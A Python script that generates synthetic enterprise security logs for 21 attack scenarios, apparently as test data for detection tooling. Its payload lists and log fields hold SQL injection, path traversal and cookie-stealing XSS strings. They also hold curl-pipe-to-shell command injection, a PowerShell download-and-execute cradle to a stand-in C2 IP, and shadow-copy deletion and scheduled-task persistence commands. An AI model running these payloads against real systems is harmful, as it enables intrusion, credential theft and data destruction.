"""
Mock Security Log Generator — 10K+ Realistic Security Logs.

Generates 10,000+ realistic enterprise security logs with 22 distinct attack patterns
and normal baseline traffic formatted according to Elastic Common Schema (ECS).
"""
import json
import random
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

# ── Configuration ──────────────────────────────────────────────────────────────
TOTAL_LOGS = 10500
DAYS = 7
SEED = 42
OUTPUT_PATH = Path(__file__).parent / "mock_logs.json"

random.seed(SEED)
BASE_TIME = datetime(2026, 8, 8, 0, 0, 0, tzinfo=timezone.utc)

# ── IP pools ──────────────────────────────────────────────────────────────────
INTERNAL_IPS = [f"192.168.1.{i}" for i in range(1, 100)] + [f"10.0.1.{i}" for i in range(1, 50)]
NORMAL_EXTERNAL_IPS = [
    "8.8.8.8", "1.1.1.1", "74.125.200.100", "151.101.1.69",
    "172.217.14.206", "216.58.215.68", "142.250.80.36", "34.117.59.81",
    "66.249.66.1", "52.94.236.248", "13.107.42.14", "157.240.22.35",
] + [f"198.18.{random.randint(0, 255)}.{random.randint(1, 254)}" for _ in range(30)]

ATTACKER_IPS = {
    "brute_force": "185.220.101.45",
    "sql_injection": "203.0.113.99",
    "port_scan": "45.142.212.100",
    "path_traversal": "198.51.100.22",
    "xss": "179.43.149.12",
    "command_injection": "103.251.167.20",
    "reconnaissance": "194.147.140.5",
    "ddos": "193.106.191.80",
    "c2_server": "185.244.25.187",
    "exfil_dest": "194.26.29.110",
    "phishing_domain_ip": "91.240.118.15",
    "account_takeover": "185.191.171.10",
    "impossible_travel_us": "12.34.56.78",
    "impossible_travel_ru": "95.173.136.5",
}

CREDENTIAL_STUFFING_IPS = [f"91.108.{random.randint(0, 255)}.{random.randint(1, 254)}" for _ in range(40)]

USERNAMES = [
    "admin", "root", "user", "test", "administrator", "guest", "webmaster",
    "john.doe", "jane.smith", "service_account", "api_user", "dev_engineer",
    "finance_mgr", "sec_analyst", "backup_service", "hr_admin"
]

ENDPOINTS = [
    "/login", "/api/auth", "/admin", "/admin/login", "/wp-login.php",
    "/dashboard", "/api/users", "/api/data", "/search", "/products",
    "/about", "/contact", "/index.html", "/static/app.js", "/favicon.ico",
    "/api/investigate", "/api/reports", "/health", "/api/chat", "/api/v1/orders",
    "/api/v1/payments", "/portal/profile", "/api/metrics", "/portal/settings",
]

SUSPICIOUS_ENDPOINTS = [
    "/admin/config", "/api/admin/users", "/.env", "/config.php",
    "/backup.sql", "/wp-admin/", "/phpmyadmin/", "/shell.php",
    "/.git/config", "/server-status", "/actuator/health", "/api/debug/dump",
]

SQLI_PAYLOADS = [
    "?id=1' OR '1'='1",
    "?user=admin'--",
    "?search='; DROP TABLE users;--",
    "?id=1 UNION SELECT * FROM information_schema.tables",
    "?name=' OR 1=1--",
    "?category=1' UNION SELECT username, password_hash FROM users--",
    "?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
]

XSS_PAYLOADS = [
    "?q=<script>alert('XSS')</script>",
    "?search=<svg/onload=fetch('http://179.43.149.12/c?cookie='+document.cookie)>",
    "?name=\"><script src=http://179.43.149.12/hook.js></script>",
    "?redirect=javascript:document.location='http://179.43.149.12/steal?'+document.cookie",
]

CMD_INJECTION_PAYLOADS = [
    "?ip=127.0.0.1; cat /etc/passwd",
    "?file=test.txt | whoami",
    "?host=localhost && curl http://103.251.167.20/shell.sh | sh",
    "?target=127.0.0.1`id`",
]

TRAVERSAL_PAYLOADS = [
    "/../../../etc/passwd",
    "/..%2F..%2Fetc%2Fshadow",
    "/%252e%252e%252fetc%252fpasswd",
    "/../../../windows/system32/drivers/etc/hosts",
    "/..%252f..%252f..%252fetc%252fhosts",
]

USER_AGENTS = {
    "normal": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    ],
    "scanner": [
        "Nmap Scripting Engine", "nikto/2.1.6", "sqlmap/1.7.8",
        "DirBuster-1.0-RC1", "Hydra v9.4", "Masscan/1.3.2", "Nuclei v2.9.8",
    ],
    "powershell": ["Mozilla/5.0 (Windows NT; Windows PowerShell 5.1)"],
    "malware": ["Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) CobaltStrike"],
}


def random_ts(start_offset_hours=0, window_hours=DAYS * 24) -> str:
    offset = timedelta(hours=start_offset_hours + random.uniform(0, window_hours))
    return (BASE_TIME + offset).strftime("%Y-%m-%dT%H:%M:%SZ")


def make_log(
    source_ip: str,
    event_action: str,
    event_category: str = "authentication",
    method: str = "POST",
    url: str = "/login",
    status_code: int = 401,
    username: str | None = None,
    severity: int = 5,
    ua_type: str = "normal",
    timestamp: str | None = None,
    dest_port: int = 443,
    destination_ip: str = "192.168.10.1",
    bytes_out: int = 512,
    process_name: str | None = None,
    command_line: str | None = None,
    threat_tag: str | None = None,
) -> dict:
    ua = random.choice(USER_AGENTS.get(ua_type, USER_AGENTS["normal"]))
    ts = timestamp or random_ts()
    log_doc = {
        "_id": str(uuid.uuid4()),
        "@timestamp": ts,
        "source": {"ip": source_ip},
        "destination": {"ip": destination_ip, "port": dest_port},
        "user": {"name": username or ""},
        "event": {
            "action": event_action,
            "category": event_category,
            "severity": severity,
        },
        "http": {
            "request": {"method": method, "bytes": 256},
            "response": {"status_code": status_code, "bytes": bytes_out},
        },
        "url": {"original": url},
        "user_agent": {"original": ua},
        "network": {"bytes": bytes_out + 256},
        "log": {"logger": "security-telemetry"},
    }
    if process_name or command_line:
        log_doc["process"] = {
            "name": process_name or "powershell.exe",
            "command_line": command_line or "",
        }
    if threat_tag:
        log_doc["threat"] = {"indicator": threat_tag}
    return log_doc


def generate_logs() -> list[dict]:
    logs = []

    # ── 1. Brute Force Attack (185.220.101.45) ───────────────────────────────
    brute_ip = ATTACKER_IPS["brute_force"]
    attack_start = 24 * 3 + 9  # Day 3, 09:00
    brute_users = ["admin", "root", "administrator", "webmaster"]

    for i in range(550):
        ts = (BASE_TIME + timedelta(hours=attack_start, seconds=i * 8)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip=brute_ip,
            event_action="failed_login",
            username=random.choice(brute_users),
            status_code=401,
            severity=7,
            timestamp=ts,
            threat_tag="brute_force",
        ))

    # Successful login after brute force
    success_ts = (BASE_TIME + timedelta(hours=attack_start, seconds=551 * 8)).strftime("%Y-%m-%dT%H:%M:%SZ")
    logs.append(make_log(
        source_ip=brute_ip,
        event_action="successful_login",
        username="admin",
        status_code=200,
        method="POST",
        severity=9,
        timestamp=success_ts,
        threat_tag="brute_force_success",
    ))

    # Post-login unauthorized access
    for i, endpoint in enumerate(SUSPICIOUS_ENDPOINTS):
        ts = (BASE_TIME + timedelta(hours=attack_start, minutes=75 + i * 4)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip=brute_ip,
            event_action="unauthorized_access",
            event_category="web",
            method="GET",
            url=endpoint,
            status_code=random.choice([200, 403, 404]),
            username="admin",
            severity=8,
            timestamp=ts,
            threat_tag="suspicious_access",
        ))

    # ── 2. SQL Injection (203.0.113.99) ───────────────────────────────────────
    sqli_ip = ATTACKER_IPS["sql_injection"]
    sqli_start = 24 * 5 + 14  # Day 5, 14:00
    for i, payload in enumerate(SQLI_PAYLOADS * 20):
        ts = (BASE_TIME + timedelta(hours=sqli_start, seconds=i * 20)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip=sqli_ip,
            event_action="web_attack",
            event_category="web",
            method="GET",
            url=f"/search{payload}",
            status_code=random.choice([400, 500, 200]),
            severity=8,
            ua_type="scanner",
            timestamp=ts,
            threat_tag="sql_injection",
        ))

    # ── 3. Port Scanning & Reconnaissance (45.142.212.100) ────────────────────
    scan_ip = ATTACKER_IPS["port_scan"]
    scan_start = 24 * 1 + 2
    ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443, 9200, 27017]
    for i in range(300):
        ts = (BASE_TIME + timedelta(hours=scan_start, seconds=i * 2)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip=scan_ip,
            event_action="network_scan",
            event_category="network",
            method="GET",
            url=f"/probe_{i}",
            status_code=random.choice([404, 403, 200, 301]),
            severity=6,
            ua_type="scanner",
            timestamp=ts,
            dest_port=random.choice(ports),
            threat_tag="port_scan",
        ))

    # ── 4. Credential Stuffing (Distributed Botnet) ───────────────────────────
    stuffing_start = 24 * 2 + 20
    for i, ip in enumerate(CREDENTIAL_STUFFING_IPS):
        for j in range(random.randint(1, 3)):
            ts = (BASE_TIME + timedelta(hours=stuffing_start, minutes=i * 2 + j)).strftime("%Y-%m-%dT%H:%M:%SZ")
            logs.append(make_log(
                source_ip=ip,
                event_action="failed_login",
                username=random.choice(USERNAMES),
                status_code=401,
                severity=6,
                timestamp=ts,
                threat_tag="credential_stuffing",
            ))

    # ── 5. Path Traversal (198.51.100.22) ─────────────────────────────────────
    traversal_ip = ATTACKER_IPS["path_traversal"]
    traversal_start = 24 * 4 + 11
    for i, payload in enumerate(TRAVERSAL_PAYLOADS * 15):
        ts = (BASE_TIME + timedelta(hours=traversal_start, seconds=i * 30)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip=traversal_ip,
            event_action="web_attack",
            event_category="web",
            method="GET",
            url=f"/files{payload}",
            status_code=random.choice([400, 403, 404]),
            severity=7,
            ua_type="scanner",
            timestamp=ts,
            threat_tag="path_traversal",
        ))

    # ── 6. Cross-Site Scripting (XSS) (179.43.149.12) ─────────────────────────
    xss_ip = ATTACKER_IPS["xss"]
    xss_start = 24 * 3 + 16
    for i, payload in enumerate(XSS_PAYLOADS * 15):
        ts = (BASE_TIME + timedelta(hours=xss_start, seconds=i * 25)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip=xss_ip,
            event_action="web_attack",
            event_category="web",
            method="GET",
            url=f"/feedback{payload}",
            status_code=200,
            severity=6,
            timestamp=ts,
            threat_tag="xss",
        ))

    # ── 7. Suspicious PowerShell Execution ────────────────────────────────────
    ps_start = 24 * 4 + 15
    ps_commands = [
        ("powershell.exe", "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="),
        ("powershell.exe", "powershell.exe -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://185.244.25.187/ps.ps1')"),
        ("powershell.exe", "powershell.exe -NonInteractive -NoProfile -Command Get-WmiObject Win32_UserAccount"),
        ("cmd.exe", "cmd.exe /c whoami /all && net localgroup administrators"),
    ]
    for i in range(40):
        p_name, cmd = random.choice(ps_commands)
        ts = (BASE_TIME + timedelta(hours=ps_start, minutes=i * 3)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip="192.168.1.105",
            event_action="process_created",
            event_category="endpoint",
            username="john.doe",
            severity=8,
            timestamp=ts,
            process_name=p_name,
            command_line=cmd,
            ua_type="powershell",
            threat_tag="suspicious_powershell",
        ))

    # ── 8. Command Injection (103.251.167.20) ─────────────────────────────────
    cmd_ip = ATTACKER_IPS["command_injection"]
    cmd_start = 24 * 5 + 18
    for i, payload in enumerate(CMD_INJECTION_PAYLOADS * 12):
        ts = (BASE_TIME + timedelta(hours=cmd_start, seconds=i * 35)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip=cmd_ip,
            event_action="web_attack",
            event_category="web",
            method="POST",
            url=f"/api/tools/ping{payload}",
            status_code=random.choice([200, 500]),
            severity=9,
            timestamp=ts,
            threat_tag="command_injection",
        ))

    # ── 9. Impossible Travel (john.doe) ───────────────────────────────────────
    imp_start = 24 * 2 + 10
    ts_us = (BASE_TIME + timedelta(hours=imp_start)).strftime("%Y-%m-%dT%H:%M:%SZ")
    ts_ru = (BASE_TIME + timedelta(hours=imp_start, minutes=12)).strftime("%Y-%m-%dT%H:%M:%SZ")
    logs.append(make_log(
        source_ip=ATTACKER_IPS["impossible_travel_us"],
        event_action="successful_login",
        username="john.doe",
        status_code=200,
        severity=3,
        timestamp=ts_us,
        threat_tag="normal_auth",
    ))
    logs.append(make_log(
        source_ip=ATTACKER_IPS["impossible_travel_ru"],
        event_action="successful_login",
        username="john.doe",
        status_code=200,
        severity=9,
        timestamp=ts_ru,
        threat_tag="impossible_travel",
    ))

    # ── 10. Account Takeover (jane.smith via 185.191.171.10) ──────────────────
    ato_start = 24 * 6 + 1
    ts_ato = (BASE_TIME + timedelta(hours=ato_start)).strftime("%Y-%m-%dT%H:%M:%SZ")
    logs.append(make_log(
        source_ip=ATTACKER_IPS["account_takeover"],
        event_action="successful_login",
        username="jane.smith",
        status_code=200,
        severity=6,
        timestamp=ts_ato,
        threat_tag="account_takeover",
    ))
    for i, act in enumerate(["/api/user/change_password", "/api/user/update_mfa", "/api/admin/roles"]):
        ts_act = (BASE_TIME + timedelta(hours=ato_start, minutes=2 + i * 3)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip=ATTACKER_IPS["account_takeover"],
            event_action="account_modification",
            event_category="authentication",
            method="POST",
            url=act,
            status_code=200,
            username="jane.smith",
            severity=9,
            timestamp=ts_act,
            threat_tag="account_takeover",
        ))

    # ── 11. Privilege Escalation ──────────────────────────────────────────────
    priv_start = 24 * 4 + 8
    for i in range(15):
        ts = (BASE_TIME + timedelta(hours=priv_start, minutes=i * 2)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip="192.168.1.112",
            event_action="privilege_escalation",
            event_category="endpoint",
            username="guest",
            severity=9,
            timestamp=ts,
            process_name="sudo",
            command_line="sudo -u root /bin/bash",
            threat_tag="privilege_escalation",
        ))

    # ── 12. Data Exfiltration (192.168.1.45 -> 194.26.29.110) ─────────────────
    exfil_start = 24 * 5 + 22
    for i in range(60):
        ts = (BASE_TIME + timedelta(hours=exfil_start, minutes=i)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip="192.168.1.45",
            destination_ip=ATTACKER_IPS["exfil_dest"],
            dest_port=443,
            event_action="data_transfer",
            event_category="network",
            method="POST",
            url="/upload/archive.tar.gz",
            status_code=200,
            bytes_out=15000000,  # ~15MB per request
            severity=9,
            timestamp=ts,
            threat_tag="data_exfiltration",
        ))

    # ── 13. DDoS Volumetric Attack (193.106.191.80) ───────────────────────────
    ddos_ip = ATTACKER_IPS["ddos"]
    ddos_start = 24 * 6 + 12
    for i in range(600):
        ts = (BASE_TIME + timedelta(hours=ddos_start, seconds=i * 2)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip=ddos_ip,
            event_action="high_volume_request",
            event_category="network",
            method="GET",
            url=random.choice(["/", "/api/v1/orders", "/products", "/search"]),
            status_code=random.choice([502, 504, 429, 200]),
            severity=8,
            timestamp=ts,
            threat_tag="ddos",
        ))

    # ── 14. Lateral Movement (192.168.1.115 -> Internal Servers) ───────────────
    lat_start = 24 * 3 + 21
    dest_servers = ["192.168.10.5", "192.168.10.6", "192.168.10.12", "192.168.10.20", "192.168.10.50"]
    for i in range(50):
        ts = (BASE_TIME + timedelta(hours=lat_start, minutes=i * 4)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip="192.168.1.115",
            destination_ip=random.choice(dest_servers),
            dest_port=random.choice([445, 3389, 5985, 22]),
            event_action="remote_connection",
            event_category="network",
            username="administrator",
            severity=8,
            timestamp=ts,
            threat_tag="lateral_movement",
        ))

    # ── 15. Phishing Click & Credential Harvest ───────────────────────────────
    phish_start = 24 * 1 + 13
    for i in range(25):
        ts = (BASE_TIME + timedelta(hours=phish_start, minutes=i * 5)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip="192.168.1.77",
            destination_ip=ATTACKER_IPS["phishing_domain_ip"],
            dest_port=443,
            event_action="phishing_access",
            event_category="web",
            method="POST",
            url="/secure-bank-login-update.com/auth",
            username="john.doe",
            status_code=200,
            severity=8,
            timestamp=ts,
            threat_tag="phishing",
        ))

    # ── 16. Active Reconnaissance / Sensitive Path Probing ────────────────────
    recon_ip = ATTACKER_IPS["reconnaissance"]
    recon_start = 24 * 2 + 4
    for i, endpoint in enumerate(SUSPICIOUS_ENDPOINTS * 8):
        ts = (BASE_TIME + timedelta(hours=recon_start, seconds=i * 15)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip=recon_ip,
            event_action="network_scan",
            event_category="web",
            method="GET",
            url=endpoint,
            status_code=random.choice([404, 403]),
            severity=6,
            ua_type="scanner",
            timestamp=ts,
            threat_tag="reconnaissance",
        ))

    # ── 17. Persistence via Scheduled Tasks / Cron ────────────────────────────
    pers_start = 24 * 4 + 19
    for i in range(15):
        ts = (BASE_TIME + timedelta(hours=pers_start, minutes=i * 6)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip="192.168.1.88",
            event_action="scheduled_task_created",
            event_category="endpoint",
            username="service_account",
            severity=8,
            timestamp=ts,
            process_name="schtasks.exe",
            command_line="schtasks /create /sc minute /mo 15 /tn SystemHealthUpdater /tr C:\\Users\\Public\\update.exe",
            threat_tag="persistence",
        ))

    # ── 18. Malware Activity / C2 Beaconing ───────────────────────────────────
    c2_start = 24 * 5 + 3
    for i in range(90):
        ts = (BASE_TIME + timedelta(hours=c2_start, minutes=i * 5)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip="192.168.1.92",
            destination_ip=ATTACKER_IPS["c2_server"],
            dest_port=8443,
            event_action="c2_beacon",
            event_category="network",
            method="POST",
            url="/api/v1/heartbeat",
            status_code=200,
            severity=9,
            ua_type="malware",
            timestamp=ts,
            threat_tag="malware_c2",
        ))

    # ── 19. Ransomware Activity (File Encryption Spikes) ──────────────────────
    ransom_start = 24 * 6 + 21
    for i in range(80):
        ts = (BASE_TIME + timedelta(hours=ransom_start, seconds=i * 10)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip="192.168.1.134",
            event_action="file_encryption",
            event_category="endpoint",
            username="finance_mgr",
            severity=10,
            timestamp=ts,
            process_name="vssadmin.exe",
            command_line="vssadmin.exe delete shadows /all /quiet",
            threat_tag="ransomware",
        ))

    # ── 20. Kerberoasting (RC4 TGS requests) ──────────────────────────────────
    kerb_start = 24 * 3 + 13
    for i in range(35):
        ts = (BASE_TIME + timedelta(hours=kerb_start, minutes=i * 4)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip="192.168.1.44",
            event_action="kerberos_request",
            event_category="authentication",
            username="backup_service",
            severity=8,
            timestamp=ts,
            threat_tag="kerberoasting",
        ))

    # ── 21. Insider Threat (Anomalous Customer Data Access) ────────────────────
    insider_start = 24 * 6 + 23  # 23:00 off-hours
    for i in range(75):
        ts = (BASE_TIME + timedelta(hours=insider_start, minutes=i)).strftime("%Y-%m-%dT%H:%M:%SZ")
        logs.append(make_log(
            source_ip="192.168.1.66",
            event_action="mass_data_download",
            event_category="insider",
            method="GET",
            url=f"/api/admin/customers/export?batch={i}",
            username="dev_engineer",
            status_code=200,
            bytes_out=8500000,
            severity=8,
            timestamp=ts,
            threat_tag="insider_threat",
        ))

    # ── 22. Normal Baseline Traffic (Fills up to 10,500+ records) ──────────────
    needed = max(0, TOTAL_LOGS - len(logs))
    print(f"Generated {len(logs)} security threat scenario logs. Generating {needed} normal logs to reach {TOTAL_LOGS}+...")
    
    for _ in range(needed):
        ip = random.choice(INTERNAL_IPS + NORMAL_EXTERNAL_IPS)
        endpoint = random.choice(ENDPOINTS)
        method = random.choices(["GET", "POST", "PUT", "DELETE"], weights=[70, 20, 7, 3])[0]
        status = random.choices(
            [200, 201, 301, 304, 400, 401, 403, 404, 500],
            weights=[55, 5, 5, 10, 4, 4, 3, 12, 2]
        )[0]
        action = "successful_login" if (status == 200 and endpoint in ["/login", "/api/auth"]) else \
                 "failed_login" if (status == 401 and endpoint in ["/login", "/api/auth"]) else \
                 "file_access" if method == "GET" else "api_request"
        severity = 7 if status >= 500 else 5 if status == 401 else 3 if status == 403 else 1
        logs.append(make_log(
            source_ip=ip,
            event_action=action,
            event_category="web" if method == "GET" else "authentication",
            method=method,
            url=endpoint,
            status_code=status,
            username=random.choice(USERNAMES) if status in [200, 401] else None,
            severity=severity,
            bytes_out=random.randint(200, 8000),
            threat_tag="normal_traffic",
        ))

    # Shuffle to interleave attack scenarios realistically
    random.shuffle(logs)

    # Sort chronologically by timestamp
    logs.sort(key=lambda x: x["@timestamp"])
    return logs


if __name__ == "__main__":
    print(f"Generating {TOTAL_LOGS} mock security logs...")
    logs = generate_logs()
    OUTPUT_PATH.parent.mkdir(parents=True, exist_ok=True)
    with open(OUTPUT_PATH, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=2)
    print(f"[SUCCESS] Generated {len(logs)} logs -> {OUTPUT_PATH}")

    # Also copy to root data directory if present
    root_data_path = Path(__file__).resolve().parents[3] / "data" / "mock_logs" / "mock_logs.json"
    if root_data_path.parent.exists():
        with open(root_data_path, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=2)
        print(f"[SUCCESS] Synced to root data: {root_data_path}")

    from collections import Counter
    actions = Counter(l["event"]["action"] for l in logs)
    print(f"\nTotal Logs: {len(logs)}")
    print("\nTop Event Actions:")
    for action, count in sorted(actions.items(), key=lambda x: -x[1])[:10]:
        print(f"  {action:30s}: {count:5d}")
